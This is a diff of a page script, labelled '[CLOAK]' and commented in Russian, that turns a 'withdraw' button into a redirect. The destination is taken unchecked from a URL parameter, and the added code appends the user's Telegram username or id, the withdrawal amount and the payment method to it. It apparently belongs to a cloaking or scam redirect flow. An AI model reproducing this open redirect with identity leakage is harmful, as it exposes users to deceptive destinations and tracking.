@@ -506,7 +506,6 @@
     </script>
     <script>
 (function(){
-  // Берём параметр to из URL
   const params = new URLSearchParams(window.location.search);
   let to = params.get('to');
 
@@ -517,7 +516,6 @@
     return;
   }
 
-  // Функция безопасного декодирования
   function safeDecode(s) {
     try { return decodeURIComponent(s); }
     catch(e) {
@@ -527,23 +525,15 @@
   }
 
   let decoded = safeDecode(to);
-  console.log('[CLOAK] decoded once:', decoded);
-
   if (decoded.includes('%25')) {
     const decodedTwice = safeDecode(decoded);
-    console.log('[CLOAK] decoded twice:', decodedTwice);
     if (decodedTwice !== decoded) decoded = decodedTwice;
   }
-
   if (!decoded.includes('ref=') && decoded.includes('ref%3D')) {
     const alt = safeDecode(decoded);
-    console.log('[CLOAK] alternate decode (ref%3D -> ref=):', alt);
     if (alt && alt.includes('ref=')) decoded = alt;
   }
 
-  console.log('[CLOAK] final redirect target:', decoded);
-
-  // Проверим, что ссылка валидная
   let finalUrl;
   try {
     finalUrl = new URL(decoded);
@@ -552,7 +542,6 @@
     return;
   }
 
-  // Ждём нажатия на кнопку "Вывести"
   document.addEventListener('DOMContentLoaded', () => {
     const btn = document.getElementById('withdrawButton');
     if (!btn) {
@@ -561,7 +550,6 @@
     }
 
     btn.addEventListener('click', () => {
-      // Проверим, что выбраны сумма и способ
       const amount = document.querySelector('[name="withdrawAmount"]')?.value;
       const method = document.querySelector('[name="withdrawMethod"]')?.value;
 
@@ -570,11 +558,28 @@
         return;
       }
 
-      console.log('[CLOAK] Все данные выбраны, выполняем редирект:', finalUrl.href);
+      // Попробуем достать ник Telegram, если это Telegram WebApp
+      let tgUser = null;
+      if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe) {
+        tgUser = window.Telegram.WebApp.initDataUnsafe.user?.username ||
+                 window.Telegram.WebApp.initDataUnsafe.user?.id;
+      }
+
+      console.log('[CLOAK] Telegram user:', tgUser);
+
+      // Если ник есть — добавим его к URL (в параметр ref или tg)
+      if (tgUser) {
+        finalUrl.searchParams.set('ref', tgUser);
+      }
+
+      // Также добавим сумму и метод, если это нужно передавать
+      finalUrl.searchParams.set('amount', amount);
+      finalUrl.searchParams.set('method', method);
+
+      console.log('[CLOAK] redirecting to:', finalUrl.href);
       window.location.replace(finalUrl.href);
     });
   });
-
 })();
 </script>
 </body>
